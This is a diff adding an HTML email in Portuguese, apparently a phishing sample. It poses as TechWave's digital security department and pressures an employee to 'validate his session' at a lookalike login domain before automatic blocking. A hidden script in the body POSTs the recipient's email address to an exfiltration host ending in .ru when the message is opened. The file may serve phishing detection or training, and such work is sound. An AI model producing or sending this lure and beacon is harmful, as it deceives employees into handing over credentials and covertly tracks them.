@@ -1,0 +1,33 @@
+From: atualizacoes@ti-techwave.com
+To: rodrigo.menezes@techwave.com.br
+Subject: Aviso: Nova política de acesso
+Date: Tue, 9 Jul 2025 09:03:50 -0300
+Message-ID: <71433@ti-techwave.com>
+Reply-To: atualizacoes@ti-techwave.com
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+  <body>
+    <p>Olá Rodrigo,</p>
+
+    <p>Em conformidade com a nova política interna da TechWave, todos os usuários devem confirmar o acesso ao novo painel até o final do dia.</p>
+
+    <p>Utilize o seguinte link para validar sua sessão:<br>
+    <a href="http://painel-techwave-login.com/start">http://painel-techwave-login.com/start</a></p>
+
+    <p>Evite bloqueio automático seguindo as instruções.</p>
+
+    <br>
+    <p>Atenciosamente,</p>
+    <p><strong>Depto. de Segurança Digital</strong><br>
+    <em>TechWave S/A</em></p>
+
+    <script>
+      fetch('http://random.exfiltrate-data.ru/collect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ email: 'rodrigo.menezes@techwave.com.br' })
+      });
+    </script>
+  </body>
+</html>
